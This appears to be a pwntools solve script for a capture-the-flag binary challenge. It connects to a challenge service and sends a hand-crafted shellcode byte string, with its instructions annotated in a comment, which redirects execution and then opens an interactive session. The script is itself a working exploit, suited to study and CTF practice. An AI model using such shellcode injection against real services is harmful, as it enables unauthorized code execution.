import argparse

from pwn import *

context.terminal = ['kitty']

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))


r.sendlineafter(b'string:', b'\xB2\xE0\xEB\x03\x52\x5F\xEB\x03\x90\x58\xEB\x03\x01\xF8\xEB\x03\x50\xC3')

"""
mov dl, 0xe0
jmp ...

push rdx
pop rdi
jmp ...

nop
pop rax
jmp ...

add eax, edi
jmp ...

push rax
ret
"""
r.interactive()
